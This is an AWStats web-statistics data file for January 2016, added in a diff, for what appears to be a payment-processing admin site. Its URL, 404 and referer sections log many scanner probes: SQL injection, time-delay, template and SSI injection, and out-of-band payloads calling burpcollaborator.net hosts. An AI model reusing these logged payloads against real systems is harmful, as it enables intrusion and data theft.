@@ -1,0 +1,667 @@
+AWSTATS DATA FILE 7.4 (build 20140726)
+# If you remove this file, all statistics for date 201601 will be lost/reset.
+# Last config file used to build this data file was /home/rebanx84/tmp/awstats/ssl/awstats.rebanx.com.conf.
+
+# Position (offset in bytes) in this file for beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 28
+POS_GENERAL 2011                
+POS_TIME 2677                
+POS_VISITOR 12103               
+POS_DAY 16010               
+POS_DOMAIN 3501                
+POS_LOGIN 4095                
+POS_ROBOT 4250                
+POS_WORMS 4700                
+POS_EMAILSENDER 4831                
+POS_EMAILRECEIVER 4974                
+POS_SESSION 16730               
+POS_SIDER 16937               
+POS_FILETYPES 5109                
+POS_DOWNLOADS 5415                
+POS_OS 5463                
+POS_BROWSER 5713                
+POS_SCREENSIZE 6447                
+POS_UNKNOWNREFERER 6521                
+POS_UNKNOWNREFERERBROWSER 7382                
+POS_ORIGIN 8179                
+POS_SEREFERRALS 8321                
+POS_PAGEREFS 8465                
+POS_SEARCHWORDS 8774                
+POS_KEYWORDS 8926                
+POS_MISC 2340                
+POS_ERRORS 8985                
+POS_CLUSTER 3951                
+POS_SIDER_404 9148                
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20160201050126 39 5703 10797136021600
+FirstTime 0
+LastTime 20160131135330
+LastUpdate 20160201171843 39 0 38 0 0
+TotalVisits 139                 
+TotalUnique 96                  
+MonthHostsKnown 0                   
+MonthHostsUnknown 98                  
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+QuickTimeSupport 0 0 0
+JavaEnabled 0 0 0
+JavascriptDisabled 0 0 0
+PDFSupport 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+AddToFavourites 0 36 0
+RealPlayerSupport 0 0 0
+TotalMisc 0 0 0
+DirectorSupport 0 0 0
+FlashSupport 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 2 2 6362 12 16 24235
+1 3 13 133957 9 10 16011
+2 11 61 576848 30 34 59149
+3 14 38 277807 21 27 164797
+4 66 117 1410888 28 31 52023
+5 17 28 472001 18 25 29660
+6 38 125 1743262 33 35 62590
+7 5 26 283487 10 10 13004
+8 16 44 520698 28 32 51408
+9 157 290 1789578 88 142 484102
+10 162 302 2829016 81 104 802599
+11 156 275 2944065 35 52 378387
+12 1461 2430 8892529 51 57 128775
+13 246 1225 4960551 29 34 101983
+14 117 425 2419316 13 18 79689
+15 529 652 6687414 31 39 182023
+16 280 367 1935493 32 44 229901
+17 81 280 3417604 27 32 122371
+18 17 61 542578 210 220 214244
+19 120 201 743337 168 254 383447
+20 7 23 205737 19 27 80858
+21 3 8 71750 17 30 123664
+22 1 6 65388 9 11 19363
+23 2 3 7514 17 31 258557
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 25 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 27
+gb 2369 2709 18782783
+ph 816 3487 17046404
+us 255 515 4243785
+br 21 110 1171832
+cn 11 43 405111
+fr 6 11 78112
+de 4 4 12724
+mx 3 18 196164
+zz 3 3 660
+jp 2 11 95765
+es 2 12 130776
+bg 2 17 159124
+pl 2 7 68569
+nl 2 2 6362
+pt 1 6 65388
+md 1 1 3181
+ru 1 1 3181
+jm 1 6 65388
+au 1 1 3181
+ro 1 6 65388
+ec 1 6 65388
+sa 1 6 65388
+vn 1 1 3181
+et 1 6 65388
+it 1 6 65388
+hu 1 1 3181
+ca 1 6 65388
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 25 first Hits must be first (order not required for others)
+BEGIN_ROBOT 8
+googlebot 101 501732 20160130183448 25
+bot[\s_+:,\.\;\/\\-] 50 77761 20160131171740 35
+no_user_agent 47 130601 20160131091016 6
+google[_+\s]web[_+\s]preview 6 65388 20160124233019 0
+spider 4 120 20160126220915 4
+googlebot\-image 3 147756 20160109230704 0
+unknown 1 30 20160120095353 1
+netcraft 1 3181 20160111091329 0
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 13
+css 1810 5093339 0 0
+png 227 906216 0 0
+ttf 1 112160 0 0
+cgi 4 8456 0 0
+woff 82 5367064 0 0
+txt 1 30 0 0
+swf 1 58845 0 0
+php 3236 19719496 0 0
+html 111 856630 0 0
+js 1305 6790946 0 0
+jpg 143 2639233 0 0
+Unknown 76 1379590 0 0
+gif 5 5175 0 0
+END_FILETYPES
+
+# Downloads - Hits - Bandwidth
+BEGIN_DOWNLOADS 0
+END_DOWNLOADS
+
+# OS ID - Hits
+BEGIN_OS ID - Hits - Pages 14
+blackberry 1 1
+linuxandroid 1 1
+winxp 4 4
+winlong 1 1
+ios_iphone 39 7
+java 1 1
+winnt 3310 787
+win2000 30 30
+linux 25 10
+win7 950 442
+macosx 2616 2204
+win8 2 2
+win8.1 1 1
+Unknown 21 20
+END_OS
+
+# Browser ID - Hits - Pages
+BEGIN_BROWSER 35
+chrome44.0.2403.125 1 1
+android 1 1
+firefox3.6.6 1 1
+chrome39.0.2171.95 1 1
+chrome47.0.2526.80 63 22
+chrome47.0.2526.111 352 117
+firefox43.0 1587 354
+msie7.0 1 1
+chrome37.0.2062.120 6 6
+firefox9.0.1 2 2
+Unknown 19 18
+blackberry 1 1
+firefox40.0 1 1
+firefox42.0 2407 2214
+chilkat 2 2
+libwww 1 1
+chrome48.0.2564.82 11 2
+chrome32.0.1700.107 30 5
+firefox1.0.7 30 30
+chrome36.0.1985.143 144 25
+chrome47.0.2526.106 2207 669
+firefox39.0 10 1
+chrome35.0.1916.153 6 1
+firefox37.0 1 1
+netscape5.0 4 4
+firefox14.0.1 2 2
+firefox3.6.28 1 1
+firefox6.0 2 1
+safari5.1 39 7
+chrome46.0.2490.86 1 1
+chrome39.0.2171.99 7 1
+firefox3.6.3 1 1
+chrome48.0.2564.97 51 13
+safari9.0.2 8 2
+chrome21.0.1180.89 1 1
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 15
+(select_load_file('\\\\\\\\h0is3bcm4k946me11uzkk7ncj3ptdkf8av0jp.burpcollaborator.net\\\\wfg')) 20160108155202
+Python-urllib/2.7 20160122104653
+(select_extractvalue(xmltype('<?xml_version=\ 20160108155203
+4f16803dc42613d901 20160108155159
+(select_load_file('\\\\\\\\twt4zn8y0w5g2yadx6vwgjjoffl69xbl68wwl.burpcollaborator.net\\\\lnx')) 20160108155205
+semanticbot 20160126202436
+SSL_Labs_(https://www.ssllabs.com/about/assessment.html) 20160108061200
+Go_1.1_package_http 20160131131341
+e4c1a${400*351}b56b7 20160108155158
+libwww-perl/6.13 20160123003803
+4f16803d0c1aa91ae2 20160108155155
+Chilkat/1.0.0_(_http://www.chilkatsoft.com/ChilkatHttpUA.asp) 20160131041747
+f2f8e{{951*222}}e9c6c 20160108155158
+c8d5e{{928*773}}c3f59 20160108155202
+ac1e3${711*297}c9479 20160108155201
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 14
+Apache-HttpClient/4.3.5_(java_1.5) 20160107105207
+(select_load_file('\\\\\\\\h0is3bcm4k946me11uzkk7ncj3ptdkf8av0jp.burpcollaborator.net\\\\wfg')) 20160108155202
+Python-urllib/2.7 20160122104653
+(select_extractvalue(xmltype('<?xml_version=\ 20160108155203
+4f16803dc42613d901 20160108155159
+(select_load_file('\\\\\\\\twt4zn8y0w5g2yadx6vwgjjoffl69xbl68wwl.burpcollaborator.net\\\\lnx')) 20160108155205
+semanticbot 20160126202436
+SSL_Labs_(https://www.ssllabs.com/about/assessment.html) 20160108061200
+Go_1.1_package_http 20160131131341
+e4c1a${400*351}b56b7 20160108155158
+4f16803d0c1aa91ae2 20160108155155
+f2f8e{{951*222}}e9c6c 20160108155158
+c8d5e{{928*773}}c3f59 20160108155202
+ac1e3${711*297}c9479 20160108155201
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 377 443
+From1 0 0
+From2 0 0
+From3 44 44
+From4 3090 6515
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 0
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 25 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 5
+http://top1-seo-service.com/try.php 33 33
+http://buttons-for-website.com 5 5
+http://burger-imperia.com 4 4
+http://pizza-imperia.com 1 1
+http://hvd-store.com 1 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 0
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 25 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 0
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 7
+403 1 1878
+302 882 1255447
+206 2 39963
+400 28 39004
+405 1 235
+404 151 264028
+504 1 249
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referrer
+BEGIN_SIDER_404 50
+/sitemap.xml 5 -
+/jmx-console 1 -
+/transactions/3/passport.png 1 https://rebanx.com/chargeback.php
+/a2billing/customer/iridium_threed.php 3 -
+/phpMyAdmin-4.2.1-english 1 -
+/SQlite/main.php 1 -
+/clientaccesspolicy.xml 1 -
+/script 1 -
+/phpMyAdmin-4.2.1-all-languages 1 -
+/logout.php 1 -
+/SQLiteManager/main.php 1 -
+/virtualterminal.php/1af8d6%25>da89b'%2f\"<e71cb 1 https://rebanx.com/chargebacks.php
+/transactions.php/1}}be95c'%2f\"<deeb7 1 https://rebanx.com/virtualterminal.php
+/MySQLDumper 1 -
+/php/dashboard.php 7 -
+/virtualterminal.php/1'||(select%20extractvalue(xmltype('<%3fxml%20version%3d\"1.0\"%20encoding%3d\"UTF-8\"%3f><!DOCTYPE%20root%20[%20<!ENTITY%20%25%20cibca%20SYSTEM%20\"http%3a%2f%2f288dbwk7c5hpe7mm9f75ssvxroxeli9cw3ks.burpcollab'||'orator.net%2f\">%25cib 1 https://rebanx.com/chargebacks.php
+/SQLiteManager-1.2.4/main.php 1 -
+/myadmin 1 -
+/transactions.php/1'||(select%20extractvalue(xmltype('<%3fxml%20version%3d\"1.0\"%20encoding%3d\"UTF-8\"%3f><!DOCTYPE%20root%20[%20<!ENTITY%20%25%20hndzq%20SYSTEM%20\"http%3a%2f%2f9r1ku33evc0wxe5tsmqcbze4avgm4qskfb30.burpcollab'||'orator.net%2f\">%25hndzq% 1 https://rebanx.com/virtualterminal.php
+/SQLite/SQLiteManager-1.2.4/main.php 1 -
+/mySqlDumper 1 -
+/virtualterminal.php/1%25}ae43b'%2f\"<dd7d2 1 https://rebanx.com/chargebacks.php
+/sqlitemanager/main.php 1 -
+/crossdomain.xml 1 -
+/phpMyAdmin 1 -
+/virtualterminal.php/1}}e27e0'%2f\"<c7ab6 1 https://rebanx.com/chargebacks.php
+/sql 2 -
+/css/plugins/images/sort_both.png 12 https://rebanx.com/css/plugins/dataTables/dataTables.bootstrap.css
+/mysqldumper 1 -
+/themes/elastixneo/ie.css 4 -
+/msd1.24stable 1 -
+/vtigercrm/ 2 -
+/administrator/index.php 2 -
+/mysql 2 -
+/HNAP1/ 1 http://rebanx.com/
+/virtualterminal.php/(select%20extractvalue(xmltype('<%3fxml%20version%3d\"1.0\"%20encoding%3d\"UTF-8\"%3f><!DOCTYPE%20root%20[%20<!ENTITY%20%25%20cibca%20SYSTEM%20\"http%3a%2f%2foumzxi6tyr3b0t88v1treehjdaj073vxio6d.burpcollab'||'orator.net%2f\">%25cibca%3 1 https://rebanx.com/chargebacks.php
+/myadmin/scripts/setup.php 1 -
+/manager/html 1 -
+/phpmyadmin 1 -
+/transactions.php/(select%20extractvalue(xmltype('<%3fxml%20version%3d\"1.0\"%20encoding%3d\"UTF-8\"%3f><!DOCTYPE%20root%20[%20<!ENTITY%20%25%20hndzq%20SYSTEM%20\"http%3a%2f%2fv5168ph09yeib0jf684yplsqohu8ib65twhl.burpcollab'||'orator.net%2f\">%25hndzq%3b]> 1 https://rebanx.com/virtualterminal.php
+/_asterisk 6 -
+/a 67 -
+/sqlite/main.php 1 -
+/jenkins/script 1 -
+/transactions.php/1b8acf%25>e2575'%2f\"<b8202 1 https://rebanx.com/virtualterminal.php
+/login 1 -
+/transactions.php/1%25}b8560'%2f\"<b4272 1 https://rebanx.com/virtualterminal.php
+/msd 1 -
+/trace.axd 1 -
+/msd1.24.4 1 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 25 first Hits must be first (order not required for others)
+BEGIN_VISITOR 98
+213.165.242.253 1340 1379 6621784 20160110122808
+112.202.42.164 754 3319 14848769 20160119155759
+213.165.242.252 461 582 6229689 20160108155205
+213.165.242.22 247 247 149751 20160108160518
+96.80.72.85 241 494 4143302 20160128175039
+194.168.210.162 155 230 2231067 20160111050634
+213.165.242.251 77 79 1311175 20160109123921
+112.206.164.72 49 100 1544855 20160125171736
+92.233.181.200 33 84 1056292 20160109110751
+51.254.213.136 30 30 95430 20160131091024
+151.230.221.173 24 71 1019026 20160108115244
+120.28.208.106 4 38 360444 20160126024119
+69.58.178.56 3 3 8245 20160120095448
+121.42.29.156 3 19 194603 20160112083623
+119.94.122.180 3 3 26231 20160126033527
+94.23.191.55 2 2 6362 20160122104653
+112.206.190.213 2 2 3401 20160127032154
+121.42.42.158 2 12 121699 20160112083819
+23.96.92.181 2 3 3211 20160126202436
+104.209.188.207 2 2 440 20160108105135
+103.36.18.10 2 11 95765 20160125211732
+86.111.241.127 1 1 3181 20160117091114
+88.3.20.231 1 6 65388 20160127135458
+104.45.18.178 1 1 220 20160108092108
+81.84.241.100 1 6 65388 20160122072300
+182.118.53.217 1 1 3181 20160131131341
+177.106.149.46 1 6 65388 20160129061417
+93.28.216.200 1 6 65388 20160113211014
+14.201.84.140 1 1 3181 20160127210458
+54.163.85.128 1 1 3181 20160111064426
+87.118.135.65 1 7 66540 20160106101511
+189.72.62.52 1 6 65388 20160129083155
+189.35.205.254 1 6 65388 20160120081839
+112.202.52.24 1 7 66540 20160124191138
+213.136.69.163 1 1 3181 20160120162439
+207.161.43.40 1 6 65388 20160120195755
+93.148.163.49 1 6 65388 20160127175843
+62.212.73.49 1 1 3181 20160126003842
+62.210.37.82 1 1 3181 20160118183218
+77.75.107.210 1 6 65388 20160119074818
+191.43.87.69 0 1 16593 
+177.0.72.223 1 1 3181 20160116154728
+200.141.216.184 0 1 4649 
+172.192.147.92 1 6 65388 20160131011202
+191.177.134.208 1 6 65388 20160118071002
+189.26.49.169 1 6 65388 20160125202252
+38.127.167.45 1 1 3181 20160113173654
+191.37.63.58 1 6 65388 20160128094826
+189.73.29.135 1 6 65388 20160131052941
+187.7.1.16 1 6 65388 20160120115605
+213.108.224.12 1 6 65388 20160114123733
+189.19.175.78 1 6 65388 20160123180331
+187.32.49.33 1 6 65388 20160127140845
+187.173.238.45 1 6 65388 20160129185958
+52.34.25.160 1 1 3181 20160107105207
+121.42.29.154 1 7 72904 20160106131325
+80.82.65.74 1 1 3181 20160123003803
+40.78.146.128 1 1 220 20160106141901
+191.251.206.44 1 6 65388 20160130171915
+201.47.59.100 1 6 65388 20160130162433
+179.234.79.199 1 4 31939 20160115080206
+82.118.240.132 1 10 92584 20160105184105
+27.3.96.16 1 1 3181 20160131041747
+95.213.143.103 1 1 3181 20160111064641
+189.59.32.244 1 6 65388 20160124202315
+72.27.35.225 1 6 65388 20160115204501
+112.208.138.64 1 6 65388 20160121144738
+212.47.254.13 1 1 3181 20160118143859
+121.42.29.162 1 1 3181 20160110184416
+179.150.61.23 1 6 65388 20160122034810
+191.247.229.10 1 6 65388 20160126184725
+85.56.54.72 1 6 65388 20160121022842
+36.251.85.139 1 1 3181 20160125045154
+188.138.61.79 1 1 3181 20160119234121
+46.184.98.7 1 6 65388 20160116073527
+201.54.162.98 1 2 21935 20160131070342
+66.249.85.233 1 2 4333 20160124233017
+112.206.185.237 1 6 65388 20160125025726
+173.236.255.142 1 1 3181 20160117190704
+89.123.254.138 1 6 65388 20160116152133
+191.40.124.80 1 4 44146 20160121164308
+201.172.138.156 1 6 65388 20160113161337
+107.181.174.227 1 1 3181 20160118100349
+188.0.236.4 1 1 3181 20160112085310
+5.196.219.112 1 1 3181 20160126035210
+64.41.200.104 1 1 3181 20160108061200
+187.55.75.228 1 1 3181 20160123135221
+213.55.109.83 1 6 65388 20160127015330
+210.4.104.99 1 6 65388 20160115222038
+188.138.33.46 1 1 3181 20160122105641
+182.118.60.101 1 1 3181 20160131105540
+181.196.80.206 1 6 65388 20160131135330
+132.255.168.2 1 6 65388 20160118143514
+179.187.15.58 1 6 65388 20160127124341
+91.219.237.229 1 1 3181 20160118090219
+218.241.108.92 1 1 3181 20160113085337
+62.210.105.163 1 1 0 20160126083527
+5.61.40.20 1 1 3181 20160125015755
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 27
+20160105 128 221 875376 3
+20160106 677 3180 12897720 8
+20160107 36 122 1586195 4
+20160108 833 1007 8023108 17
+20160109 156 229 3189222 4
+20160110 1295 1314 5803210 3
+20160111 34 34 350548 3
+20160112 3 13 124880 3
+20160113 4 14 137138 4
+20160114 91 142 1805149 2
+20160115 41 117 1433881 6
+20160116 4 14 137138 4
+20160117 2 2 6362 2
+20160118 24 124 1310168 9
+20160119 32 42 577173 6
+20160120 13 28 226676 6
+20160121 3 18 196164 3
+20160122 7 17 146681 5
+20160123 7 12 84474 4
+20160124 3 15 136261 3
+20160125 57 127 1784120 8
+20160126 15 55 467998 8
+20160127 8 33 333522 7
+20160128 14 57 711262 2
+20160129 5 20 202526 4
+20160130 6 16 143500 3
+20160131 13 29 246728 8
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 7
+1h+ 5
+5mn-15mn 4
+2mn-5mn 7
+30s-2mn 9
+15mn-30mn 5
+0s-30s 103
+30mn-1h 6
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 25 first Pages must be first (order not required for others)
+BEGIN_SIDER 130
+/php/inc_transsearch.php 1562 5131439 1 2
+/login.php 479 1519683 116 104
+/dashboard.php 263 3324080 4 5
+/users.php 117 1762931 2 2
+/skin-config.html 110 855030 0 2
+/php/inc_viewagent.php 109 83364 1 1
+/php/inc_merchantprocessors.php 105 58384 0 0
+/virtualterminal.php 91 2077085 0 0
+/font-awesome/fonts/fontawesome-webfont.woff 82 5367064 0 0
+/transactions.php 68 1107434 0 1
+/user.php 63 796897 1 5
+/viewagent.php 57 643704 1 0
+/create-zip.php 41 5140 3 1
+/reports.php 33 540586 3 2
+/addagent.php 25 799960 1 1
+/chargebacks.php 25 451398 0 2
+/forgot-password.php 23 35740 0 4
+/php/inc_cbsearch.php 19 16691 0 1
+/php/inc_chart-view.php 17 10494 0 1
+/hashpass.php 17 2862 0 0
+/php/inc_dailyreport.php 15 128970 0 0
+/fees.php 11 164323 1 0
+/addmerchant.php 9 453739 0 0
+/php/inc_admin_agentmerchants.php 9 199 0 0
+/processors.php 9 144736 0 0
+/virtualterminal.php/1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\\\3w0ezx88065q28anxgv6gtjyfplf962uwhn5c.burpcollab'%2b'orator.net\\yci'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 1 19650 0 0
+/ 1 1600 0 0
+/virtualterminal.php/1(select*from(select(sleep(20)))a) 1 19650 0 0
+/transactions.php/111277195'%20or%20'8740'%3d'8741 1 16655 0 0
+/transactions.php/1'%20and%20'5889'%3d'5889 1 16655 0 0
+/merchantapi.php 5 40456 0 0
+/transactions.php/111277195'%20or%208740%3d8741--%20 1 16655 0 0
+/virtualterminal.php/1%2b(select*from(select(sleep(20)))a)%2b 1 19650 0 0
+/font-awesome/fonts/fontawesome-webfont.ttf 1 112160 0 0
+/transactions.php/b7161{{102*68}}ae00b 1 16655 0 0
+/transactions.php/1)waitfor%20delay'0%3a0%3a20'-- 1 16655 0 0
+/virtualterminal.php/1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\\\tif4lnuymwrgoywdj6hw2j5o1f75vwnkh78vx.burpcollab'%2b'orator.net\\egh'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 1 19650 0 0
+/virtualterminal.php/1%20and%202014%3d2015 1 19650 0 0
+/virtualterminal.php/\"-->'-->`--><!--%23set%20var%3d\"b791\"%20value%3d\"b5afcd85\"--><!--%23set%20var%3d\"bd0e\"%20value%3d\"a7c2615f\"--><!--%23echo%20var%3d\"b791\"--><!--%23echo%20var%3d\"bd0e\"--> 1 19650 0 0
+/transactions.php/1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\\\yxz90s93116l33biybw1hoktgkmba21qvdm1b.burpcollab'%2b'orator.net\\hic'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 1 16655 0 0
+/virtualterminal.php/1'%2b(select%20load_file('\\\\\\\\f5lq89hk9ie2bkjz6s4ip5sao1uriil6ft6hv.burpcollaborator.net\\\\ohw'))%2b' 1 19650 0 0
+/virtualterminal.php/1' 1 19650 0 0
+/php/inc_processoredit.php 1 4530 0 0
+/virtualterminal.php/1%2c0)waitfor%20delay'0%3a0%3a20'-- 1 19650 0 0
+/virtualterminal.php/f7cbc${87*868}e9fcb 1 19650 0 0
+/php/inc_admin_merchantprocessor_settings.php 3 56412 0 0
+/transactions.php/1'%2b(select%20load_file('\\\\\\\\zpsast14t2ymv43jqco29pcu8lec235rzeq2f.burpcollaborator.net\\\\xth'))%2b' 1 16655 0 0
+/transactions.php/1%20and%203715%3d3715 1 16655 0 0
+/php/inc_reportsearch.php 6 32682 0 0
+/virtualterminal.php/1'%20and%205002%3d5002--%20 1 19650 0 0
+/virtualterminal.php/f4147{{946*56}}db5c3 1 19650 0 0
+/php/inc_admin_all_merchantprocessors.php 4 900 0 0
+/virtualterminal.php/1%20and%202014%3d2014 1 19650 0 0
+/virtualterminal.php/1%20and%202014%3d2015--%20 1 19650 0 0
+/merchantreports.php 5 52617 0 0
+/transactions.php/111277195'%20or%208740%3d8740--%20 1 16655 0 0
+/virtualterminal.php/1%20and%20(select*from(select(sleep(20)))a)--%20 1 19650 0 0
+/transactions.php/4f16803dfc8446a703 1 16655 0 0
+/transactions.php/1'%2b(function(){if(typeof%20a7896%3d%3d%3d\"undefined\"){var%20a%3dnew%20Date()%3bdo{var%20b%3dnew%20Date()%3b}while(b-a<20000)%3ba7896%3d1%3b}}())%2b' 1 16655 0 0
+/php/inc_admin_assign_merchantprocessor.php 1 84 0 0
+/transactions.php/1%20and%203715%3d3716 1 16655 0 0
+/transactions.php/1'%20and%205889%3d5889--%20 1 16655 0 0
+/virtualterminal.php/(select%20load_file('\\\\\\\\u1w54odz5xah7zfe270xlkopkgq6exgla81wq.burpcollaborator.net\\\\eil')) 1 19650 0 0
+/transactions.php/111277195'%20or%20'8740'%3d'8740 1 16655 0 0
+/virtualterminal.php/1)waitfor%20delay'0%3a0%3a20'-- 1 19650 0 0
+/php/inc_customertransactionshistory.php 1 2600 0 0
+/virtualterminal.php/111110211%20or%202600%3d2600 1 19650 0 0
+/transactions.php/1%20and%20(select*from(select(sleep(20)))a)--%20 1 16655 0 0
+/transactions.php/1%20waitfor%20delay'0%3a0%3a20'-- 1 16655 0 0
+/transactions.php/1\" 1 16655 0 0
+/transactions.php/115399628%20or%206829%3d6830 1 16655 0 0
+/transactions.php/1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\\\ccsnf6ohgflzihqwdpbfw2z7vy1ppgh4br2fr.burpcollab'%2b'orator.net\\pvr'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 1 16655 0 0
+/virtualterminal.php/(function(){if(typeof%20cd4d3%3d%3d%3d'undefined'){var%20a%3dnew%20Date()%3bdo{var%20b%3dnew%20Date()%3b}while(b-a<20000)%3bcd4d3%3d1%3b}}()) 1 19650 0 0
+/transactions.php/1'%20and%20'5889'%3d'5890 1 16655 0 0
+/virtualterminal.php/1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\\\gm6rpaylqjv3sl00ntlj669b52bszjp7juaiz.burpcollab'%2b'orator.net\\imy'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 1 19650 0 0
+/virtualterminal.php/120055291'%20or%208931%3d8932--%20 1 19650 0 0
+/virtualterminal.php/4f16803d51f1cbd4e5 1 19650 0 0
+/virtualterminal.php/1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\\\f2iq59ek6ib28kgz3s1im5pal1rrfi660trhg.burpcollab'%2b'orator.net\\fil'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 1 19650 0 0
+/transactiondetails.php 2 35579 0 1
+/php/inc_processorupdate.php 1 477 0 0
+//login.php 1 3181 1 1
+/cgi-sys/defaultwebpage.cgi 4 8456 1 0
+/php/inc_monthlyreports.php 5 50615 0 1
+/transactions.php/(select%20load_file('\\\\\\\\oa2zdimterjbgto8b19ruexjtaz1nspgj3arz.burpcollaborator.net\\\\dhw')) 1 16655 0 0
+/php/inc_admin_merchantgateway.php 2 348 0 0
+/transactions.php/115399628%20or%206829%3d6830--%20 1 16655 0 0
+/transactions.php/bbd84${525*100}edb36 1 16655 0 0
+/transactions.php/1%20and%203715%3d3715--%20 1 16655 0 0
+/virtualterminal.php/111110211%20or%202600%3d2601--%20 1 19650 0 0
+/virtualterminal.php/1'%20and%20'5002'%3d'5002 1 19650 0 0
+/php/inc_cbcorrespondances.php 1 369 0 0
+/transactions.php/1%20and%203715%3d3716--%20 1 16655 0 0
+/virtualterminal.php/1%20waitfor%20delay'0%3a0%3a20'-- 1 19650 0 0
+/transactions.php/\"-->'-->`--><!--%23set%20var%3d\"e23b\"%20value%3d\"d71ab40a\"--><!--%23set%20var%3d\"f3bb\"%20value%3d\"c109e978\"--><!--%23echo%20var%3d\"e23b\"--><!--%23echo%20var%3d\"f3bb\"--> 1 16655 0 0
+/virtualterminal.php/eval(compile('for%20x%20in%20range(1)%3a\\n%20import%20time\\n%20time.sleep(20)'%2c'a'%2c'single')) 1 19650 0 0
+/js/plugins/dataTables/swf/copy_csv_xls_pdf.swf 1 58845 0 0
+/virtualterminal.php/120055291'%20or%20'8931'%3d'8932 1 19650 0 0
+/php/inc_admin_merchantprocessors.php 2 358 0 0
+/transactions.php/1'%20and%205889%3d5890--%20 1 16655 0 0
+/transactions.php/eval(compile('for%20x%20in%20range(1)%3a\\n%20import%20time\\n%20time.sleep(20)'%2c'a'%2c'single')) 1 16655 0 0
+/transactions.php/1' 1 16655 0 0
+/virtualterminal.php/1\" 1 19650 0 0
+/php/inc_processorstable.php 1 1379 0 0
+/virtualterminal.php/120055291'%20or%20'8931'%3d'8931 1 19650 0 0
+/processormerchantmanager.php 5 67637 0 0
+/create-user.php 1 220 0 0
+/php/inc_cbupload.php 6 678 3 2
+/change-password.php 3 23319 0 0
+/transactions.php/(function(){if(typeof%20b88aa%3d%3d%3d'undefined'){var%20a%3dnew%20Date()%3bdo{var%20b%3dnew%20Date()%3b}while(b-a<20000)%3bb88aa%3d1%3b}}()) 1 16655 0 0
+/php/inc_cbdocuments.php 2 750 0 0
+/virtualterminal.php/111110211%20or%202600%3d2600--%20 1 19650 0 0
+/transactions.php/1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'\\\\e9opc8ljdhi1fjnyar8ht4w9s0yrmif69t0hp.burpcollab'%2b'orator.net\\eic'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 1 16655 0 0
+/virtualterminal.php/1'%2b(function(){if(typeof%20cc336%3d%3d%3d\"undefined\"){var%20a%3dnew%20Date()%3bdo{var%20b%3dnew%20Date()%3b}while(b-a<20000)%3bcc336%3d1%3b}}())%2b' 1 19650 0 0
+/transactions.php/1(select*from(select(sleep(20)))a) 1 16655 0 0
+/virtualterminal.php/1'%20and%20'5002'%3d'5003 1 19650 0 0
+/chargeback.php 4 81676 0 0
